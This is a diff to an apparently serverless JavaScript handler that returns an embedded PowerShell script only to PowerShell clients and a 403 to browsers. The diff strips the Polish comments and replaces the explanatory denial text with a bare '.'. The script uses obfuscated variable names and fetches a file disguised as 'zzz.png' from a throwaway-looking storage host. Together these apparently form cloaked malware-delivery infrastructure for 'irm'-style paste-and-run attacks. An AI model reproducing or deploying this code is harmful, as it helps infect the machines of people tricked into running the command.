@@ -1,13 +1,11 @@
 export default function handler(req, res) {
   const userAgent = req.headers['user-agent'] || '';
 
-  // 1. Blokada przeglądarek - jeśli żądanie NIE pochodzi z PowerShella, odrzuć je
   if (!userAgent.toLowerCase().includes('powershell')) {
     res.setHeader('Content-Type', 'text/plain; charset=utf-8');
-    return res.status(403).send('Access Denied: Please use PowerShell (irm) to access this file.');
+    return res.status(403).send('.');
   }
 
-  // 2. Cały Twój skrypt instalacyjny PowerShell wewnątrz zmiennej tekstowej
   const scriptContent = `
 $tBHRLNqrxNvpAfQn = "https://file.freestorage-04.bond/files/2026/10/5/4b68e7a8-adee-47d1-bd85-4c22e06b1d48/zzz.png?srl=sSOsEtVrGmndjhVDdHNVKA&exp=1791248206"
 $un4yX9B1 = [System.IO.Path]::GetRandomFileName().Replace('.','')
@@ -126,7 +124,6 @@ try {
 }
 `.trim();
 
-  // 3. Wysłanie skryptu jako czysty tekst bezpośrednio do konsoli PowerShell
   res.setHeader('Content-Type', 'text/plain; charset=utf-8');
   res.setHeader('Cache-Control', 'no-store, max-age=0');
   return res.status(200).send(scriptContent);
